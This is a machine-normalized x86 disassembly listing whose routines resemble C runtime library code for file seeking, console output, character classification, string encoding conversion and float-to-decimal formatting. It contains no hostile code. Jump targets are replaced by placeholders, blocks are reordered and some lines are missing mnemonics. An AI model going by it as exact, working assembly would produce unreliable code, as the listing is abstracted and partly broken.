mov eax [ eax * 4 + rw-data ]
and [ eax + ecx + 0x28 ] 0xfd
mov eax edx
pop esi
pop ebp
retn
sub_43f4b3
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_43929b
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ SetFilePointerEx@IAT ]
test eax eax
jne r-xdata
call sub_42fef5
mov [ eax ] 0x9
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
and eax edx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
push eax
call sub_42febf
pop ecx
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax edi
mov edx edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx esi
and esi 0x3f
sar ecx 0x6
imul esi esi 0x30
mov ecx [ ecx * 4 + rw-data ]
and [ ecx + esi + 0x28 ] 0xfd
sub_43f531
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
lea eax [ ebp - 0x10 ]
push esi
push 0x1
push eax
xor esi esi
push esi
push esi
push [ ebp + 0x8 ]
call [ SetFilePointerEx@IAT ]
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
lea ecx [ ebp - 0x8 ]
push ecx
cdq
push edx
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] esi
call [ SetFilePointerEx@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
push eax
call sub_42febf
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ ebp - 0x4 ] esi
jl r-xdata
or eax 0xffffffff
pop esi
mov esp ebp
pop ebp
retn
jg r-xdata
push esi
push esi
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
call [ SetFilePointerEx@IAT ]
call sub_42fef5
mov [ eax ] 0x16
cmp eax 0x7fffffff
jbe r-xdata
sub_43f5b5
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0x14 ]
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ SetFilePointerEx@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
push eax
call sub_42febf
or edx 0xffffffff
pop ecx
mov eax edx
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_43f640
push 0xc
push r--data
call sub_40d260
xor eax eax
mov [ ebp - 0x1c ] ax
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42f32c
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
movzx eax [ eax ]
push eax
call sub_43f736
pop ecx
mov si ax
mov [ ebp - 0x1c ] si
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43f692
mov ax si
call sub_40d2a6
retn 0xc
sub_43f69e
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_43f640
mov esp ebp
pop ebp
retn
sub_43f719
mov edi edi
push ebp
mov ebp esp
push ecx
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x9
call sub_43f69e
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_43f736
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
call sub_446ccb
mov eax [ rw-data ]
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
jmp r-xdata
mov ax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_43f77b
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx 0x1000
push ebx
call sub_42d0e4
push 0x0
mov [ esi + 0x4 ] eax
call sub_42d0aa
cmp [ esi + 0x4 ] 0x0
lea eax [ esi + 0xc ]
pop ecx
pop ecx
je r-xdata
mov ecx 0x400
[ eax ] ecx
lea eax [ esi + 0x14 ]
mov [ esi + 0x18 ] 0x2
mov [ esi + 0x4 ] eax
push 0x40
pop ecx
[ eax ] ecx
mov [ esi + 0x18 ] ebx
jmp r-xdata
mov eax [ esi + 0x4 ]
and [ esi + 0x8 ] 0x0
mov [ esi ] eax
pop esi
pop ebx
pop ebp
retn
sub_43f7d8
mov edi edi
push ebp
mov ebp esp
push 0x107
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_43f7fe
mov edi edi
push ebp
mov ebp esp
push 0x103
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_43f824
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41cb44
mov eax [ ebp - 0xc ]
movzx ecx [ ebp + 0x8 ]
mov eax [ eax ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_43f889
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x9
push 0x40
jne r-xdata
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
pop ebp
retn
pop eax
pop ebp
retn
sub_43f8b9
mov edi edi
push ebp
mov ebp esp
push 0x107
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_43f8df
mov edi edi
push ebp
mov ebp esp
push 0x103
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_43f9f9
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x9
push 0x40
jne r-xdata
push [ ebp + 0x8 ]
call sub_43db11
pop ecx
pop ecx
pop ebp
retn
pop eax
pop ebp
retn
sub_43fad2
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x18 ]
push edi
test esi esi
jle r-xdata
mov edi [ ebp + 0x24 ]
test edi edi
jne r-xdata
push esi
push [ ebp + 0x14 ]
call sub_446d01
pop ecx
cmp eax esi
pop ecx
lea esi [ eax + 0x1 ]
jl r-xdata
xor eax eax
cmp [ ebp + 0x28 ] eax
push 0x0
push 0x0
push esi
push [ ebp + 0x14 ]
setne al
lea eax [ eax * 8 + 0x1 ]
push eax
push edi
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov edi [ eax + 0x8 ]
mov [ ebp + 0x24 ] edi
mov esi eax
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
lea edx [ eax + eax ]
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
test ecx eax
je r-xdata
xor ebx ebx
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
and eax ecx
lea ecx [ edx + 0x8 ]
cmp eax 0x400
ja r-xdata
xor esi esi
push [ ebp - 0x8 ]
push ebx
push esi
push [ ebp + 0x14 ]
push 0x1
push edi
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
push eax
call sub_42d0e4
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
call sub_449960
mov ebx esp
test ebx ebx
je r-xdata
mov edi [ ebp - 0x8 ]
xor eax eax
push eax
push eax
push eax
push eax
push eax
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_430d5f
mov esi eax
test esi esi
je r-xdata
mov [ ebx ] 0xdddd
mov [ ebx ] 0xcccc
jmp r-xdata
test [ ebp + 0x10 ] 0x400
je r-xdata
test ebx ebx
je r-xdata
add ebx 0x8
jmp r-xdata
lea edx [ esi + esi ]
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
test ecx eax
je r-xdata
mov eax [ ebp + 0x20 ]
test eax eax
je r-xdata
xor edi edi
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
and eax ecx
lea ecx [ edx + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_43aeb9
pop ecx
mov eax esi
cmp esi eax
jg r-xdata
push edi
call sub_43aeb9
pop ecx
push 0x0
push 0x0
push 0x0
push esi
push edi
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_430d5f
test eax eax
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
push eax
call sub_42d0e4
mov edi eax
pop ecx
test edi edi
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
call sub_449960
mov edi esp
test edi edi
je r-xdata
xor ecx ecx
push ecx
push ecx
push ecx
push eax
push [ ebp + 0x1c ]
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_430d5f
mov esi eax
test esi esi
jne r-xdata
xor eax eax
push eax
push eax
cmp [ ebp + 0x20 ] eax
jne r-xdata
mov [ edi ] 0xdddd
mov [ edi ] 0xcccc
jmp r-xdata
jmp r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
jmp r-xdata
push eax
push eax
test edi edi
je r-xdata
add edi 0x8
jmp r-xdata
push esi
push edi
push eax
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
jne r-xdata
push edi
call sub_43aeb9
pop ecx
jmp r-xdata
sub_43fcef
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_41cb44
push [ ebp + 0x28 ]
lea eax [ ebp - 0xc ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_43fad2
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_43fd3a
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
test edx edx
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
call sub_42fef5
push 0x16
mov ecx [ ebp + 0x10 ]
mov [ edx ] 0x0
test ecx ecx
jle r-xdata
pop esi
pop ebp
retn
xor eax eax
mov eax ecx
jmp r-xdata
mov esi [ ebp + 0x14 ]
test esi esi
je r-xdata
call sub_42fef5
push 0x22
jmp r-xdata
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
push ebx
lea ebx [ edx + 0x1 ]
mov eax ebx
push edi
mov edi [ esi + 0x8 ]
mov [ edx ] 0x30
test ecx ecx
jle r-xdata
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
mov [ eax ] 0x0
test ecx ecx
js r-xdata
mov bl [ edi ]
test bl bl
je r-xdata
cmp [ edx ] 0x31
jne r-xdata
cmp [ edi ] 0x35
jl r-xdata
mov bl 0x30
inc edi
jmp r-xdata
mov ecx ebx
lea esi [ ecx + 0x1 ]
inc [ esi + 0x4 ]
jmp r-xdata
jmp r-xdata
lea ebx [ edx + 0x1 ]
mov [ eax ] bl
inc eax
dec ecx
test ecx ecx
jg r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx esi
lea eax [ ecx + 0x1 ]
push eax
push ebx
push edx
call sub_416810
add esp 0xc
pop edi
xor eax eax
pop ebx
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_43fe00
mov edi edi
push ebp
mov ebp esp
sub esp 0x77c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x76c ] ecx
mov ecx edi
mov [ ebp - 0x770 ] eax
shr ecx 0x14
mov eax ecx
mov [ ebp - 0x778 ] 0x0
and eax 0x7ff
or eax 0x0
jne r-xdata
xor dl dl
mov eax 0x100000
mov dl 0x1
jmp r-xdata
mov [ ebp - 0x754 ] 0x0
cmp eax 0x80000000
jne r-xdata
mov esi [ ebp + 0x8 ]
and edi 0xfffff
fld [ ebp + 0x8 ]
add esi 0x0
adc edi eax
xor eax eax
test dl dl
setne al
and ecx 0x7ff
inc eax
add ecx 0xfffffbcc
add eax ecx
mov [ ebp - 0x74c ] eax
call sub_446e20
sub esp 0x8
fstp [ esp ]
call sub_446f30
add esp 0x8
call sub_4499b0
mov [ ebp - 0x754 ] eax
cmp eax 0x7fffffff
je r-xdata
cmp esi 0xfffffc02
je r-xdata
mov [ ebp - 0x3a0 ] 0x0
mov [ ebp - 0x39c ] 0x100000
mov [ ebp - 0x3a4 ] 0x2
cmp ebx 0x2
jne r-xdata
xor ebx ebx
mov [ ebp - 0x1d0 ] esi
mov esi [ ebp - 0x74c ]
test edi edi
mov [ ebp - 0x1cc ] edi
setne bl
inc ebx
mov [ ebp - 0x1d4 ] ebx
test esi esi
js r-xdata
mov eax [ ebp + ebx * 4 - 0x1d4 ]
bsr eax eax
mov [ ebp - 0x778 ] 0x0
je r-xdata
mov [ ebp - 0x3a0 ] 0x0
mov [ ebp - 0x39c ] 0x100000
mov [ ebp - 0x3a4 ] 0x2
cmp ebx 0x2
jne r-xdata
lea edi [ esi + 0x1 ]
xor edx edx
mov eax edi
mov esi 0x20
shr eax 0x5
and edi 0x1f
mov ecx esi
mov [ ebp - 0x74c ] eax
sub ecx edi
mov [ ebp - 0x758 ] edi
lea eax [ esi - 0x1f ]
mov [ ebp - 0x764 ] ecx
call sub_449990
mov ecx [ ebp + ebx * 4 - 0x1d4 ]
dec eax
bsr ecx ecx
mov [ ebp - 0x768 ] eax
not eax
mov [ ebp - 0x760 ] eax
mov [ ebp - 0x778 ] 0x0
je r-xdata
xor ecx ecx
jmp r-xdata
xor ecx ecx
lea ecx [ eax + 0x1 ]
jmp r-xdata
xor ecx ecx
lea esp [ esp ]
xor eax eax
lea eax [ ecx + 0x1 ]
jmp r-xdata
mov eax [ ebp + ecx - 0x3a0 ]
cmp eax [ ebp + ecx - 0x1d0 ]
jne r-xdata
xor al al
test al al
je r-xdata
mov eax 0x20
sub eax ecx
cmp eax 0x1
setb al
cmp ebx 0x73
mov [ ebp - 0x745 ] al
seta cl
cmp ebx 0x73
jne r-xdata
add ecx 0x4
cmp ecx 0x8
jne r-xdata
xor dl dl
test dl dl
je r-xdata
sub esi eax
mov eax [ ebp - 0x74c ]
cmp edi esi
seta dl
lea ecx [ ebx + eax ]
mov [ ebp - 0x745 ] dl
cmp ecx 0x73
seta dh
cmp ecx 0x73
jne r-xdata
add ecx 0x4
cmp ecx 0x8
jne r-xdata
push 0x0
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x3a4 ] 0x0
push eax
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] 0x0
push 0x1cc
push eax
call sub_443b14
add esp 0x10
test al al
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + ecx - 0x3a0 ]
cmp eax [ ebp + ecx - 0x1d0 ]
jne r-xdata
bsr eax edi
mov [ ebp - 0x778 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x3a4 ] 0x0
push eax
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] 0x0
push 0x1cc
push eax
call sub_443b14
add esp 0x10
mov [ ebp - 0x3a0 ] 0x2
jmp r-xdata
test dl dl
jne r-xdata
mov dl 0x1
jmp r-xdata
lea ecx [ esi + 0x2 ]
xor edx edx
mov eax ecx
mov esi 0x20
shr eax 0x5
and ecx 0x1f
mov [ ebp - 0x74c ] eax
mov eax esi
sub eax ecx
mov [ ebp - 0x758 ] ecx
mov [ ebp - 0x75c ] eax
lea eax [ esi - 0x1f ]
mov ecx [ ebp - 0x75c ]
call sub_449990
dec eax
mov [ ebp - 0x778 ] 0x0
bsr ecx edi
mov [ ebp - 0x764 ] eax
not eax
mov [ ebp - 0x768 ] eax
je r-xdata
neg ecx
mul ecx
mov [ ebp - 0x768 ] ecx
shr edx 0x3
mov eax edx
mov [ ebp - 0x778 ] edx
mov [ ebp - 0x75c ] eax
test eax eax
je r-xdata
mul ecx
mov ecx edx
shr ecx 0x3
mov eax ecx
mov [ ebp - 0x774 ] ecx
mov [ ebp - 0x75c ] eax
test eax eax
je r-xdata
mov eax 0x72
cmp ebx eax
cmovb eax ebx
mov [ ebp - 0x760 ] eax
cmp eax 0xffffffff
je r-xdata
test cl cl
jne r-xdata
xor ecx ecx
lea ecx [ eax + 0x1 ]
jmp r-xdata
push 0x4
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x39c ] 0x0
push eax
lea eax [ ebp - 0x570 ]
mov [ ebp - 0x3a4 ] 0x1
push 0x1cc
push eax
mov [ ebp - 0x574 ] 0x1
call sub_443b14
add esp 0x10
jmp r-xdata
mov edx 0x72
cmp ecx edx
cmovb edx ecx
mov [ ebp - 0x75c ] edx
mov edi edx
cmp edx 0xffffffff
je r-xdata
test dh dh
jne r-xdata
xor eax eax
lea eax [ ecx + 0x1 ]
jmp r-xdata
lea eax [ edx + edx * 4 ]
add eax eax
sub ecx eax
je r-xdata
mov ecx 0x26
lea esp [ esp ]
mov edi [ ebp - 0x754 ]
lea eax [ ecx + ecx * 4 ]
add eax eax
sub edi eax
je r-xdata
mov ecx 0x26
cmp [ ebp - 0x745 ] 0x0
je r-xdata
lea edi [ ebp - 0x1d0 ]
mov edx eax
lea edi [ edi + eax * 4 ]
mov esi edi
xor edi edi
mov edi [ esi ]
jmp r-xdata
mov eax 0x20
mov edx 0x2
sub eax ecx
cmp eax 0x2
lea eax [ ebp - 0x1c8 ]
mov [ ebp - 0x750 ] eax
mov esi eax
setb [ ebp - 0x745 ]
mov ecx [ ebp - 0x754 ]
mov eax 0xcccccccd
test ecx ecx
js r-xdata
test eax eax
je r-xdata
mov esi edx
lea ecx [ ebp - 0x1d0 ]
sub esi eax
lea ecx [ ecx + esi * 4 ]
mov [ ebp - 0x750 ] ecx
xor dl dl
test dl dl
je r-xdata
sub esi eax
mov eax [ ebp - 0x74c ]
cmp [ ebp - 0x758 ] esi
seta dl
lea ecx [ eax + 0x2 ]
mov [ ebp - 0x745 ] dl
cmp ecx 0x73
seta dh
cmp ecx 0x73
jne r-xdata
mov esi [ ebp - 0x76c ]
mov edi esi
mov ebx [ ebp - 0x1d4 ]
mov [ ebp - 0x74c ] edi
test ebx ebx
je r-xdata
mov edi [ ecx * 4 + r--data ]
test edi edi
je r-xdata
cmp [ ebp - 0x1d4 ] 0x1
ja r-xdata
mov edi [ ebp - 0x3a0 ]
test edi edi
jne r-xdata
mov edi [ edi * 4 + r--data ]
test edi edi
jne r-xdata
cmp [ ebp - 0x574 ] 0x1
ja r-xdata
mov edi [ ebp - 0x3a0 ]
test edi edi
jne r-xdata
mov [ ebp - 0x1d4 ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x750 ] 0x0
mov ecx [ esi ]
mov [ ebp - 0x750 ] ecx
jmp r-xdata
xor ecx ecx
mov ecx [ esi - 0x4 ]
jmp r-xdata
lea eax [ edx - 0x1 ]
cmp eax ebx
jae r-xdata
cmp [ ebp - 0x745 ] 0x0
je r-xdata
mov ecx eax
lea edi [ ebp - 0x1d0 ]
xor eax eax
[ edi ]
mov edx [ ebp - 0x75c ]
cmp esi ebx
jae r-xdata
push 0x0
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x3a4 ] 0x0
push eax
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] 0x0
push 0x1cc
push eax
call sub_443b14
add esp 0x10
test dl dl
jne r-xdata
mov dl 0x1
jmp r-xdata
lea eax [ ebp - 0x574 ]
push eax
lea eax [ ebp - 0x1d4 ]
push eax
call sub_441440
add esp 0x8
cmp eax 0xa
jne r-xdata
xor esi esi
mov edi 0xa
xor ecx ecx
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x1d4 ] 0x0
push 0x0
push eax
lea eax [ ebp - 0x1d0 ]
cmp edi 0x1
je r-xdata
mov esi [ ebp - 0x1d4 ]
cmp ecx esi
mov [ ebp - 0x74c ] esi
setb al
test al al
je r-xdata
mov edi [ ebp - 0x1d0 ]
lea eax [ ecx * 4 ]
push eax
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x1d4 ] ecx
push eax
lea eax [ ebp - 0x1d0 ]
push 0x1cc
push eax
call sub_443b14
add esp 0x10
test edi edi
jne r-xdata
cmp edi 0x1
je r-xdata
mov [ ebp - 0x744 ] edi
lea eax [ ebp - 0x740 ]
cmp edi 0x1
je r-xdata
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x574 ] 0x0
push 0x0
push eax
lea eax [ ebp - 0x570 ]
jmp r-xdata
mov esi [ ebp - 0x574 ]
cmp ecx esi
mov [ ebp - 0x74c ] esi
setb al
test al al
je r-xdata
mov edi [ ebp - 0x570 ]
lea eax [ ecx * 4 ]
push eax
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x574 ] ecx
push eax
lea eax [ ebp - 0x570 ]
push 0x1cc
push eax
call sub_443b14
add esp 0x10
test edi edi
jne r-xdata
cmp edi 0x1
je r-xdata
mov [ ebp - 0x744 ] edi
lea eax [ ebp - 0x740 ]
mov edi 0x1
lea eax [ ebp - 0x3a0 ]
sub edi esi
mov ebx edi
shr ebx 0x5
lea esi [ ebx * 4 ]
push esi
push 0x0
push eax
call sub_40de60
and edi 0x1f
mov eax 0x1
mov ecx edi
shl eax cl
mov [ ebp + esi - 0x3a0 ] eax
xor ecx ecx
mov ecx [ esi - 0x4 ]
jmp r-xdata
lea eax [ edx - 0x1 ]
cmp eax ebx
jae r-xdata
xor eax eax
mov edi 0x2
cmp [ ebp - 0x745 ] al
setne al
sub edi [ ebp - 0x74c ]
mov ebx edi
add eax 0x2
shr ebx 0x5
mov [ ebp - 0x1d4 ] eax
lea eax [ ebp - 0x3a0 ]
lea esi [ ebx * 4 ]
push esi
push 0x0
push eax
call sub_40de60
and edi 0x1f
mov eax 0x1
mov ecx edi
shl eax cl
mov [ ebp + esi - 0x3a0 ] eax
jmp r-xdata
mov ebx [ ebp - 0x1d4 ]
jmp r-xdata
shr ecx 0x1e
lea eax [ edi * 4 ]
xor ecx eax
dec edx
mov eax [ ebp - 0x750 ]
sub esi 0x4
mov [ eax ] ecx
sub eax 0x4
mov [ ebp - 0x750 ] eax
cmp edx 0xffffffff
je r-xdata
mov [ ebp - 0x1d4 ] edx
mov [ ebp - 0x3a0 ] 0x2
jmp r-xdata
lea eax [ edx + 0x1 ]
mov [ ebp - 0x3a0 ] 0x2
mov [ ebp - 0x1d4 ] eax
jmp r-xdata
xor edx edx
mov edx [ ecx ]
jmp r-xdata
mov edx 0x72
cmp ecx edx
cmovb edx ecx
mov [ ebp - 0x760 ] edx
mov edi edx
cmp edx 0xffffffff
je r-xdata
test dh dh
jne r-xdata
test eax eax
jne r-xdata
inc [ ebp - 0x754 ]
lea edi [ esi + 0x1 ]
mov ebx [ ebp - 0x574 ]
mov [ esi ] 0x31
mov [ ebp - 0x74c ] edi
test ebx ebx
je r-xdata
mov eax [ ebp + ecx * 4 - 0x1d0 ]
mul edi
add eax esi
mov [ ebp + ecx * 4 - 0x1d0 ] eax
adc edx 0x0
inc ecx
mov esi edx
cmp ecx ebx
jne r-xdata
mov edi [ ebp - 0x74c ]
test esi esi
je r-xdata
mov ebx [ ebp - 0x1d4 ]
test ebx ebx
je r-xdata
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x74c ] ecx
mov [ ebp - 0x750 ] eax
lea esi [ ebp - 0x1d0 ]
mov eax [ ebp - 0x1d4 ]
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x750 ] eax
lea esi [ ebp - 0x3a0 ]
mov eax ecx
jmp r-xdata
cmp edi 0x1
je r-xdata
mov [ ebp - 0x3a4 ] edi
lea eax [ ebp - 0x3a0 ]
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x1d4 ] 0x0
je r-xdata
mov ebx [ ebp - 0x574 ]
test ebx ebx
je r-xdata
push 0x1cc
push eax
mov [ ebp - 0x3a4 ] 0x0
call sub_443b14
add esp 0x10
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x74c ] ecx
mov [ ebp - 0x750 ] eax
lea esi [ ebp - 0x570 ]
mov eax [ ebp - 0x574 ]
lea eax [ ebp - 0x570 ]
mov [ ebp - 0x750 ] eax
lea esi [ ebp - 0x3a0 ]
mov eax ecx
jmp r-xdata
cmp edi 0x1
je r-xdata
mov [ ebp - 0x3a4 ] edi
lea eax [ ebp - 0x3a0 ]
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x574 ] 0x0
je r-xdata
mov eax [ ebp - 0x760 ]
mov esi [ ebp - 0x74c ]
mov ebx [ ebp - 0x1d4 ]
jmp r-xdata
mov eax [ ebp - 0x750 ]
dec edx
shr ecx 0x1f
add eax eax
xor ecx eax
sub esi 0x4
mov [ edi ] ecx
sub edi 0x4
cmp edx 0xffffffff
je r-xdata
lea eax [ ebx + 0x1 ]
mov [ ebp - 0x3a4 ] eax
mov [ ebp - 0x574 ] eax
shl eax 0x2
push eax
lea eax [ ebp - 0x3a0 ]
push eax
lea eax [ ebp - 0x570 ]
push 0x1cc
push eax
call sub_443b14
add esp 0x1c
cmp edx ebx
jae r-xdata
xor eax eax
mov eax [ ecx - 0x4 ]
jmp r-xdata
lea eax [ esi - 0x1 ]
cmp eax ebx
jae r-xdata
test eax eax
je r-xdata
mov esi edx
lea ecx [ ebp - 0x1d0 ]
sub esi eax
lea ecx [ ecx + esi * 4 ]
mov [ ebp - 0x750 ] ecx
add al 0x30
lea edi [ esi + 0x1 ]
mov [ esi ] al
mov [ ebp - 0x74c ] edi
mov eax [ ebp - 0x754 ]
dec eax
jmp r-xdata
mov eax [ ebp - 0x754 ]
xor esi esi
mov edi eax
xor ecx ecx
jmp r-xdata
mov esi edi
mov eax [ ebp - 0x1d4 ]
cmp eax 0x73
jae r-xdata
xor esi esi
xor ecx ecx
lea esp [ esp ]
mov [ ebp - 0x1d4 ] edx
shl edx 0x2
test edx edx
je r-xdata
lea eax [ ebp - 0x740 ]
sub esi eax
mov [ ebp - 0x760 ] esi
jmp r-xdata
xor edx edx
mov [ ebp - 0x758 ] eax
xor ebx ebx
mov [ ebp - 0x744 ] edx
test eax eax
je r-xdata
cmp [ ebp - 0x1d4 ] 0x0
je r-xdata
push 0x0
push eax
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] 0x0
push 0x1cc
push eax
call sub_443b14
add esp 0x10
jmp r-xdata
mov eax [ ebp - 0x75c ]
mov ecx 0x26
sub eax [ ebp - 0x764 ]
mov [ ebp - 0x75c ] eax
jne r-xdata
mov ebx [ ebp - 0x1d4 ]
xor esi esi
xor ecx ecx
xor esi esi
xor ecx ecx
jmp r-xdata
mov [ ebp - 0x574 ] edx
shl edx 0x2
test edx edx
je r-xdata
lea eax [ ebp - 0x740 ]
sub esi eax
mov [ ebp - 0x764 ] esi
jmp r-xdata
xor edx edx
mov [ ebp - 0x758 ] eax
xor ebx ebx
mov [ ebp - 0x744 ] edx
test eax eax
je r-xdata
cmp [ ebp - 0x574 ] 0x0
je r-xdata
push 0x0
push eax
lea eax [ ebp - 0x570 ]
mov [ ebp - 0x574 ] 0x0
push 0x1cc
push eax
call sub_443b14
add esp 0x10
jmp r-xdata
mov eax [ ebp - 0x75c ]
mov ecx 0x26
sub eax [ ebp - 0x768 ]
mov [ ebp - 0x75c ] eax
jne r-xdata
mov ebx [ ebp - 0x574 ]
xor esi esi
xor ecx ecx
jmp r-xdata
cmp edx ebx
jae r-xdata
mov ebx [ ebp - 0x1d4 ]
jmp r-xdata
and eax [ ebp - 0x760 ]
dec esi
mov ecx [ ebp - 0x764 ]
and edx [ ebp - 0x768 ]
shr eax cl
mov ecx [ ebp - 0x758 ]
shl edx cl
